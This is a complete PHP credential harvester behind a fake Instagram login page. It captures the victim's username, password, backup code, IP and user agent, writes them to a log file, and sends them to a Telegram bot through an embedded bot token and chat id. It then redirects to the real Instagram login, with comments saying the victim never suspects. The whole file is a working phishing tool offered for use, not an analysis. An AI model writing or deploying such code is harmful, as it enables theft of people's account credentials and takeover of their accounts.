<?php
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$user = $_POST['username'] ?? 'N/A';
$pass = $_POST['password'] ?? 'N/A';
$backup = $_POST['backup'] ?? 'N/A';
$time = date('Y-m-d H:i:s');

// Save to a simple text file (Render's disk is ephemeral, but good for temp)
$entry = "[$time] IP:$ip | USER:$user | PASS:$pass | BACKUP:$backup | UA:$ua\n";
file_put_contents('creds.log', $entry, FILE_APPEND);

// 🔔 TELEGRAM INSTANT ALERT (replace with YOUR token & chat_id)
$bot_token = '8632503432:AAEqpSb9_PUBbuOR1LHItOpOxVT-OpjFPGU';      // <-- PASTE HERE
$chat_id = '7904798576';          // <-- PASTE HERE
$msg = "🎯 NEW INSTA LOGIN\nUser: $user\nPass: $pass\nBackup: $backup\nIP: $ip";
file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=".urlencode($msg));

// 🚀 REDIRECT TO REAL INSTAGRAM – victim never suspects
header('Location: https://www.instagram.com/accounts/login/?next=%2F&source=security_alert');
exit;
?>